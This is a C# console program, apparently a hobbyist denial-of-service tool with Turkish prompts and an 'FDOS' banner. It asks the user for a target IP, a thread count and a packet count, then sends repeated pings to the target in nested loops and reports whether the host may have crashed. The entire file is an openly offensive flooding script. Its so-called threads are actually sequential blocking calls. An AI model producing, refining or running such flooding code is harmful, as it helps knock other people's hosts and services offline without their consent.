/*
Author: wgex
https://github.com/wgex
*/

using System;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.NetworkInformation;

namespace Project_Alpha
{
    class Alpha {    
        public static string floodlanacakIp;
        public static int threadSayisi;
        public static int paketSayisi;     
        public static int pingSayisi = 1;
        static void Main(string[] args)
        {
            Console.WriteLine("███████╗██████╗░░█████╗░░██████╗");
            Console.WriteLine("██╔════╝██╔══██╗██╔══██╗██╔════╝");
            Console.WriteLine("█████╗░░██║░░██║██║░░██║╚█████╗░");
            Console.WriteLine("██╔══╝░░██║░░██║██║░░██║░╚═══██╗");
            Console.WriteLine("██║░░░░░██████╔╝╚█████╔╝██████╔╝");
            Console.WriteLine("╚═╝░░░░░╚═════╝░░╚════╝░╚═════╝░");
            Console.WriteLine("|---------coded by wgex--------|");
            Console.WriteLine();

            Console.Write("Floodlanacak IP'yi giriniz > ");
            floodlanacakIp = Console.ReadLine();
            Console.WriteLine();

            Console.Write("Thread sayısını giriniz > ");
            threadSayisi = Convert.ToInt32(Console.ReadLine());
            Console.WriteLine();

            Console.Write("Paket sayısını giriniz > ");
            paketSayisi = Convert.ToInt32(Console.ReadLine());
            Console.WriteLine();

            for(int i = 0; i < paketSayisi; i++)
            {
                for(int b = 0; b < threadSayisi; b++)
                {
                    ddos();
                }
            }
        }

        public static async void ddos()
        {
            try
            {
                Ping p = new Ping();
                PingReply r;
                string s;
                s = floodlanacakIp;
                r = p.Send(s);

                if (r.Status == IPStatus.Success)
                {
                    Console.WriteLine(floodlanacakIp + " floodlanıyor..." + "  Paket gönderildi(" + pingSayisi + ". paket)");
                    await Task.Delay(1);
                }
            }

            catch
            {
                Console.WriteLine(pingSayisi + ". paket gönderilemedi. Host çökmüş olabilir mi?");
            } 

            pingSayisi++;
        }
    }
}
